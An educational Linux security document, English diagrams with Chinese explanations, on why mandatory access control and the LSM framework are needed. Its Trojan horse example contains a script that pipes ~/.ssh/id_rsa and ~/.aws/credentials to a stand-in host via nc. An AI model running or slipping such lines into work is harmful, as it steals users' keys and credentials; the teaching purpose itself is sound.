# WHY｜为什么需要安全子系统

## 1. 自主访问控制的局限性

```
LIMITS OF DISCRETIONARY ACCESS CONTROL (DAC)
+=============================================================================+
|                                                                              |
|  TRADITIONAL UNIX PERMISSION MODEL                                           |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  File permissions: rwxrwxrwx (owner/group/other)                         │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  $ ls -l /etc/passwd                                             │    │ |
|  │  │  -rw-r--r-- 1 root root 2847 Jan 1 00:00 /etc/passwd             │    │ |
|  │  │                                                                  │    │ |
|  │  │  Owner (root):  read, write                                      │    │ |
|  │  │  Group (root):  read                                             │    │ |
|  │  │  Others:        read                                             │    │ |
|  │  │                                                                  │    │ |
|  │  │  WHO DECIDES? The file OWNER (discretionary!)                    │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  PROBLEM 1: THE ROOT BYPASS                                                  |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  Root (UID 0) bypasses ALL permission checks:                    │    │ |
|  │  │                                                                  │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  $ chmod 000 /secret/file    # No permissions at all        │ │    │ |
|  │  │  │  $ ls -l /secret/file                                       │ │    │ |
|  │  │  │  ---------- 1 alice alice 100 Jan 1 00:00 /secret/file      │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  As root:                                                   │ │    │ |
|  │  │  │  # cat /secret/file          # WORKS! Root ignores perms    │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  │  CONSEQUENCE:                                                    │    │ |
|  │  │  • Compromised root = complete system compromise                 │    │ |
|  │  │  • Any service running as root has unlimited power               │    │ |
|  │  │  • Web server exploit → attacker owns everything                 │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  PROBLEM 2: NO CONTROL OVER PROGRAM BEHAVIOR                                 |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  DAC only asks: "Can USER access OBJECT?"                        │    │ |
|  │  │  NOT: "Should THIS PROGRAM access OBJECT?"                       │    │ |
|  │  │                                                                  │    │ |
|  │  │  Example:                                                        │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  User alice runs:                                           │ │    │ |
|  │  │  │  • Text editor (vim)     - legitimate, needs ~/.bashrc     │ │    │ |
|  │  │  │  • Web browser (firefox) - legitimate, needs ~/.cache      │ │    │ |
|  │  │  │  • Malware               - malicious, reads ~/.ssh/id_rsa  │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  ALL THREE run as alice → ALL can access alice's files!    │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  │  DAC cannot distinguish:                                         │    │ |
|  │  │  • Legitimate access by trusted program                          │    │ |
|  │  │  • Malicious access by untrusted/compromised program             │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  PROBLEM 3: TROJAN HORSE ATTACKS                                             |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  User runs malicious program → inherits user's permissions       │    │ |
|  │  │                                                                  │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  alice downloads "cool_game.sh" from internet               │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  #!/bin/bash                                                │ │    │ |
|  │  │  │  # Pretend to be a game                                     │ │    │ |
|  │  │  │  echo "Loading game..."                                     │ │    │ |
|  │  │  │  # Actually steal credentials                               │ │    │ |
|  │  │  │  cat ~/.ssh/id_rsa | nc attacker.com 1234                   │ │    │ |
|  │  │  │  cat ~/.aws/credentials | nc attacker.com 1234              │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  $ ./cool_game.sh     # Runs as alice, can read her files   │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  │  DAC FAILS: alice granted access, so program has access          │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
+=============================================================================+
```

**中文说明：**

**自主访问控制（DAC）的局限性**：

**传统 UNIX 权限模型**：
- 文件权限：rwxrwxrwx（所有者/组/其他）
- 谁决定？文件所有者（自主！）

**问题 1：Root 绕过**
- Root (UID 0) 绕过所有权限检查
- 后果：
  - 被攻破的 root = 完全系统攻破
  - 任何以 root 运行的服务都有无限权力
  - Web 服务器漏洞 → 攻击者拥有一切

**问题 2：无法控制程序行为**
- DAC 只问："用户能访问对象吗？"
- 不问："这个程序应该访问对象吗？"
- 所有以 alice 身份运行的程序都能访问 alice 的文件！

**问题 3：特洛伊木马攻击**
- 用户运行恶意程序 → 继承用户权限
- DAC 失败：alice 授予了访问权，所以程序有权访问

---

## 2. 强制策略的需求

```
NEED FOR MANDATORY POLICIES (MAC)
+=============================================================================+
|                                                                              |
|  THE FUNDAMENTAL SHIFT                                                       |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  DAC (Discretionary):                                            │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  File owner decides permissions                             │ │    │ |
|  │  │  │  Users can change permissions on their files                │ │    │ |
|  │  │  │  System has NO OVERRIDE                                     │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  Owner ────► "I allow everyone to read this"                │ │    │ |
|  │  │  │              chmod 644 secret.txt                           │ │    │ |
|  │  │  │              System: "Okay!"                                │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  │  MAC (Mandatory):                                                │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  System-wide policy decides access                          │ │    │ |
|  │  │  │  Users CANNOT override policy                               │ │    │ |
|  │  │  │  Even root is constrained                                   │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  Owner ────► "I allow everyone to read this"                │ │    │ |
|  │  │  │  Policy ───► "NO. secret_t files only readable by          │ │    │ |
|  │  │  │               admin_t processes"                            │ │    │ |
|  │  │  │  System: "DENIED despite owner permission!"                 │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  WHAT MAC ENABLES                                                            |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  1. LEAST PRIVILEGE                                                      │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  Each process gets ONLY the permissions it needs:                │    │ |
|  │  │                                                                  │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  httpd_t (web server):                                      │ │    │ |
|  │  │  │    ✓ Read /var/www/                                         │ │    │ |
|  │  │  │    ✓ Listen on port 80, 443                                 │ │    │ |
|  │  │  │    ✗ Read /etc/shadow                                       │ │    │ |
|  │  │  │    ✗ Write /etc/passwd                                      │ │    │ |
|  │  │  │    ✗ Execute /bin/sh                                        │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  mysqld_t (database):                                       │ │    │ |
|  │  │  │    ✓ Read/write /var/lib/mysql/                             │ │    │ |
|  │  │  │    ✓ Listen on port 3306                                    │ │    │ |
|  │  │  │    ✗ Read /var/www/                                         │ │    │ |
|  │  │  │    ✗ Access network except own port                         │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  │  2. CONFINED ROOT                                                        │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  Even processes running as root are limited:                     │    │ |
|  │  │                                                                  │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  httpd running as root (UID 0):                             │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  Without SELinux:                                           │ │    │ |
|  │  │  │    # cat /etc/shadow     ← WORKS (root can do anything)     │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  With SELinux (httpd_t domain):                             │ │    │ |
|  │  │  │    # cat /etc/shadow     ← DENIED by policy!                │ │    │ |
|  │  │  │    avc: denied { read } for name="shadow"                   │ │    │ |
|  │  │  │    scontext=system_u:system_r:httpd_t:s0                    │ │    │ |
|  │  │  │    tcontext=system_u:object_r:shadow_t:s0                   │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  │  3. APPLICATION SANDBOXING                                               │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  Programs constrained by policy, not user identity:              │    │ |
|  │  │                                                                  │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  firefox_t (browser sandbox):                               │ │    │ |
|  │  │  │    ✓ Read/write ~/.mozilla/                                 │ │    │ |
|  │  │  │    ✓ Access network                                         │ │    │ |
|  │  │  │    ✓ Display X11                                            │ │    │ |
|  │  │  │    ✗ Read ~/.ssh/                                           │ │    │ |
|  │  │  │    ✗ Read ~/.gnupg/                                         │ │    │ |
|  │  │  │    ✗ Write outside sandbox                                  │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  Malicious website exploit → still confined!                │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
+=============================================================================+
```

**中文说明：**

**强制策略（MAC）的需求**：

**基本转变**：

**DAC（自主）**：
- 文件所有者决定权限
- 用户可以更改自己文件的权限
- 系统无法覆盖

**MAC（强制）**：
- 系统范围策略决定访问
- 用户无法覆盖策略
- 即使 root 也受约束

**MAC 实现的功能**：

1. **最小权限**：每个进程只获得需要的权限
   - httpd_t：读 /var/www/，但不能读 /etc/shadow
   - mysqld_t：读写 /var/lib/mysql/，但不能读 /var/www/

2. **受限 Root**：即使以 root 运行的进程也受限
   - 无 SELinux：root 可读 /etc/shadow
   - 有 SELinux：httpd_t 域被策略拒绝

3. **应用沙箱**：程序受策略约束，而非用户身份
   - firefox_t：可访问 ~/.mozilla/，但不能读 ~/.ssh/

---

## 3. 复杂度：正确性

```
COMPLEXITY: CORRECTNESS
+=============================================================================+
|                                                                              |
|  THE CORRECTNESS CHALLENGE                                                   |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  Security checks must be:                                                │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  1. COMPLETE (no bypass)                                         │    │ |
|  │  │     Every access path must be checked                            │    │ |
|  │  │     Missing ONE check = vulnerability                            │    │ |
|  │  │                                                                  │    │ |
|  │  │  2. CONSISTENT (same decision everywhere)                        │    │ |
|  │  │     Same operation → same security check                         │    │ |
|  │  │     Inconsistency = confused deputy attacks                      │    │ |
|  │  │                                                                  │    │ |
|  │  │  3. NON-BYPASSABLE (can't go around)                             │    │ |
|  │  │     No alternative paths that skip checks                        │    │ |
|  │  │     Kernel must mediate ALL access                               │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  CHALLENGE 1: COVERAGE                                                       |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  Kernel has MANY access points:                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  File access:                                                    │    │ |
|  │  │  • open(), read(), write(), close()                              │    │ |
|  │  │  • mmap(), truncate(), link(), unlink()                          │    │ |
|  │  │  • rename(), chmod(), chown(), setxattr()                        │    │ |
|  │  │  • ... 50+ file-related syscalls                                 │    │ |
|  │  │                                                                  │    │ |
|  │  │  Network:                                                        │    │ |
|  │  │  • socket(), bind(), listen(), accept()                          │    │ |
|  │  │  • connect(), send(), recv()                                     │    │ |
|  │  │  • ... 20+ network syscalls                                      │    │ |
|  │  │                                                                  │    │ |
|  │  │  Process:                                                        │    │ |
|  │  │  • fork(), exec(), kill(), ptrace()                              │    │ |
|  │  │                                                                  │    │ |
|  │  │  IPC:                                                            │    │ |
|  │  │  • shmget(), msgget(), semget()                                  │    │ |
|  │  │                                                                  │    │ |
|  │  │  TOTAL: 200+ hooks needed for complete mediation!                │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  CHALLENGE 2: TIME-OF-CHECK TO TIME-OF-USE (TOCTOU)                          |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  Race condition between check and use:                           │    │ |
|  │  │                                                                  │    │ |
|  │  │  Thread 1                        Thread 2                        │    │ |
|  │  │  ────────                        ────────                        │    │ |
|  │  │  access("/file", R_OK)                                           │    │ |
|  │  │    → check: OK                                                   │    │ |
|  │  │                                  symlink("/etc/shadow", "/file") │    │ |
|  │  │  open("/file")                                                   │    │ |
|  │  │    → opens /etc/shadow!                                          │    │ |
|  │  │                                                                  │    │ |
|  │  │  SOLUTION: Check at ACTUAL USE, not before                       │    │ |
|  │  │  LSM hooks are placed at the point of access, not before         │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  CHALLENGE 3: POLICY COMPLEXITY                                              |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  SELinux reference policy:                                       │    │ |
|  │  │                                                                  │    │ |
|  │  │  • 100,000+ lines of policy rules                                │    │ |
|  │  │  • 4,000+ types (process/file labels)                            │    │ |
|  │  │  • 300+ roles                                                    │    │ |
|  │  │  • 40+ classes (file, socket, process, ...)                      │    │ |
|  │  │  • 100+ permissions per class                                    │    │ |
|  │  │                                                                  │    │ |
|  │  │  Policy bugs = security holes OR broken applications             │    │ |
|  │  │                                                                  │    │ |
|  │  │  Common errors:                                                  │    │ |
|  │  │  • Over-permissive: too much access (insecure)                   │    │ |
|  │  │  • Under-permissive: apps don't work (users disable SELinux)     │    │ |
|  │  │  • Inconsistent: works sometimes (confusing)                     │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
+=============================================================================+
```

**中文说明：**

**复杂度：正确性**

**正确性挑战**：

安全检查必须：
1. **完整（无绕过）**：每条访问路径必须检查，漏掉一个 = 漏洞
2. **一致（处处相同决策）**：相同操作 → 相同安全检查
3. **不可绕过**：没有跳过检查的替代路径

**挑战 1：覆盖范围**
- 文件访问：50+ 相关系统调用
- 网络：20+ 系统调用
- 进程：fork、exec、kill、ptrace
- IPC：shmget、msgget、semget
- 总计：200+ 钩子用于完全调解

**挑战 2：检查时间到使用时间（TOCTOU）**
- 检查和使用之间的竞态条件
- 解决方案：在实际使用点检查，而非之前
- LSM 钩子放置在访问点

**挑战 3：策略复杂性**
- SELinux 参考策略：100,000+ 行规则、4,000+ 类型
- 策略错误 = 安全漏洞或应用程序损坏

---

## 4. Linux 中的安全演进

```
SECURITY EVOLUTION IN LINUX
+=============================================================================+
|                                                                              |
|  TIMELINE                                                                    |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  1991: Linux 0.01                                                        │ |
|  │        • Traditional UNIX DAC only                                       │ |
|  │        • uid/gid, rwx permissions                                        │ |
|  │                                                                          │ |
|  │  1998: Linux capabilities                                                │ |
|  │        • Split root privileges into fine-grained caps                    │ |
|  │        • CAP_NET_ADMIN, CAP_SYS_ADMIN, etc.                              │ |
|  │        • Partial solution to "all-powerful root"                         │ |
|  │                                                                          │ |
|  │  2001: LSM framework proposed                                            │ |
|  │        • Generic hook framework for security modules                     │ |
|  │        • Allows pluggable security policies                              │ |
|  │                                                                          │ |
|  │  2003: SELinux merged (2.6.0)                                            │ |
|  │        • NSA-developed MAC implementation                                │ |
|  │        • Type Enforcement, RBAC, MLS                                     │ |
|  │        • First major LSM user                                            │ |
|  │                                                                          │ |
|  │  2007: AppArmor merged                                                   │ |
|  │        • Path-based MAC (simpler than SELinux)                           │ |
|  │        • Profile-based confinement                                       │ |
|  │                                                                          │ |
|  │  2009: TOMOYO merged                                                     │ |
|  │        • Learning mode, path-based                                       │ |
|  │        • Focus on ease of use                                            │ |
|  │                                                                          │ |
|  │  2012: Yama merged                                                       │ |
|  │        • ptrace restrictions                                             │ |
|  │        • Symlink hardening                                               │ |
|  │                                                                          │ |
|  │  2016: LoadPin merged                                                    │ |
|  │        • Restrict kernel module loading                                  │ |
|  │                                                                          │ |
|  │  2018: LSM stacking                                                      │ |
|  │        • Multiple LSMs can be active simultaneously                      │ |
|  │        • Yama + SELinux, AppArmor + Lockdown                             │ |
|  │                                                                          │ |
|  │  2020: Lockdown LSM                                                      │ |
|  │        • Restrict kernel modification even by root                       │ |
|  │        • Secure boot integration                                         │ |
|  │                                                                          │ |
|  │  2021+: BPF LSM                                                          │ |
|  │         • Security policies as BPF programs                              │ |
|  │         • Dynamic, programmable security                                 │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
|  LSM MODULES TODAY                                                           |
|  ┌────────────────────────────────────────────────────────────────────────┐ |
|  │                                                                          │ |
|  │  ┌─────────────────────────────────────────────────────────────────┐    │ |
|  │  │                                                                  │    │ |
|  │  │  MAJOR LSMs:                                                     │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  SELinux       - Full MAC, Type Enforcement                 │ │    │ |
|  │  │  │                  Used by: RHEL, Fedora, Android             │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  AppArmor      - Path-based profiles                        │ │    │ |
|  │  │  │                  Used by: Ubuntu, SUSE                      │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  Smack         - Simple MAC labels                          │ │    │ |
|  │  │  │                  Used by: Tizen, automotive                 │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  │  MINOR LSMs (stackable):                                         │    │ |
|  │  │  ┌────────────────────────────────────────────────────────────┐ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  │  Yama          - ptrace restrictions                        │ │    │ |
|  │  │  │  LoadPin       - Module loading restrictions                │ │    │ |
|  │  │  │  Lockdown      - Kernel integrity                           │ │    │ |
|  │  │  │  SafeSetID     - UID/GID transition restrictions            │ │    │ |
|  │  │  │  BPF           - Programmable security hooks                │ │    │ |
|  │  │  │                                                             │ │    │ |
|  │  │  └────────────────────────────────────────────────────────────┘ │    │ |
|  │  │                                                                  │    │ |
|  │  └─────────────────────────────────────────────────────────────────┘    │ |
|  │                                                                          │ |
|  └────────────────────────────────────────────────────────────────────────┘ |
|                                                                              |
+=============================================================================+
```

**中文说明：**

**Linux 中的安全演进**：

**时间线**：
- 1991：Linux 0.01 - 仅传统 UNIX DAC
- 1998：Linux capabilities - 将 root 权限分割为细粒度能力
- 2001：LSM 框架提出 - 通用钩子框架
- 2003：SELinux 合并 - NSA 开发的 MAC 实现
- 2007：AppArmor 合并 - 基于路径的 MAC
- 2009：TOMOYO 合并 - 学习模式，易用
- 2012：Yama 合并 - ptrace 限制
- 2018：LSM 堆叠 - 多个 LSM 同时活动
- 2020：Lockdown LSM - 即使 root 也限制内核修改
- 2021+：BPF LSM - 作为 BPF 程序的安全策略

**今天的 LSM 模块**：

**主要 LSM**：
- SELinux：完整 MAC，类型强制（RHEL、Fedora、Android）
- AppArmor：基于路径的配置文件（Ubuntu、SUSE）
- Smack：简单 MAC 标签（Tizen、汽车）

**次要 LSM（可堆叠）**：
- Yama：ptrace 限制
- LoadPin：模块加载限制
- Lockdown：内核完整性
- BPF：可编程安全钩子
